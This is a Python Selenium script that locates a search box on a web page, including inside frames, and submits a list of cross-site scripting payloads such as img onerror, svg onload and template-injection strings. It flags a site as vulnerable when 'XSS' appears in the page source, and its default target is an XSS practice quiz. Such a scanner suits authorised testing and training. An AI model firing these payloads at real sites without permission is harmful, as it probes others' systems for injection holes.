from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException, ElementNotInteractableException
import time


def find_search_bar(browser, url, method=None):
    browser.get(url)
    try_methods = [
        ("css_selector", "input[type='text']"),
        ("name", "q"),
        ("name", "email"),
        ("id", "search-bar"),
        ("css_selector", "input[type='search']")
    ]
    if method:
        try_methods = method

    found_search_bar = try_methods_for_search_bar(browser, try_methods)
    if found_search_bar[0]:
        return found_search_bar

    browser.switch_to.default_content()
    frames = browser.find_elements(By.TAG_NAME, "iframe") + browser.find_elements(By.TAG_NAME, "frame")

    for frame in frames:
        try:
            browser.switch_to.frame(frame)
            found_search_bar = try_methods_for_search_bar(browser, try_methods)
            if found_search_bar and found_search_bar[0]:
                return found_search_bar
        except Exception as e:
            print(f"Error switching to frame: {e}")
        finally:
            browser.switch_to.default_content()

    print("Search bar not found in any frame or the main content.")
    return [None, None, None]


def try_methods_for_search_bar(browser, try_methods):
    for method, value in try_methods:
        search_bar = try_find_search_bar(browser, method, value)
        if search_bar[0]:
            return search_bar
    return [None, None, None]


def try_find_search_bar(browser, method, value):
    try:
        search_bar = WebDriverWait(browser, 15).until(
            EC.presence_of_element_located((getattr(By, method.upper()), value))
        )
        try:
            search_bar.send_keys("Test")
            search_bar.clear()
            return [search_bar, method, value]
        except ElementNotInteractableException:
            return [None, None, None]
    except (NoSuchElementException, TimeoutException):
        return [None, None, None]


def analyze_response(browser, payload):
    alert_text = "XSS"
    if alert_text.lower() in browser.page_source.lower():
        return True, f"Potential XSS vulnerability detected with payload {payload}"
    return False, "No clear vulnerability detected based on response."


def test_xss_payloads(browser, url, search_bar):
    xss_payloads = [
        # '<script>alert("XSS")</script>',
        # '"><script>alert("XSS")</script>',
        '"><img src="invalid" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS");',
        '<svg/onload=alert("XSS")>',
        '" onfocus="alert(\'XSS\')" autofocus="',
        '<body onload=alert("XSS")>',
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        '{{7*7}}<img src="x" onerror="alert(1)">'
    ]

    results = []
    found = False

    for payload in xss_payloads:
        try:
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            time.sleep(5)
            vulnerable, result_message = analyze_response(browser, payload)
            results.append((payload, result_message))
            if vulnerable:
                found = True
            browser.back()
            time.sleep(2)
        except Exception as e:
            results.append((payload, str(e)))

    return results, found


def check_xss_in_searchbar(url):
    options = Options()
    browser = webdriver.Chrome(options=options)

    try:
        search_bar = find_search_bar(browser, url, None)[0]
        if search_bar:
            results, found = test_xss_payloads(browser, url, search_bar)
            if found:
                print("XSS vulnerability detected")
            else:
                print("No XSS vulnerability detected.")
        else:
            print("Search bar not found.")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")
    finally:
        browser.quit()


if __name__ == '__main__':
    url = "https://xss-quiz.int21h.jp"  # Replace with the actual URL
    check_xss_in_searchbar(url)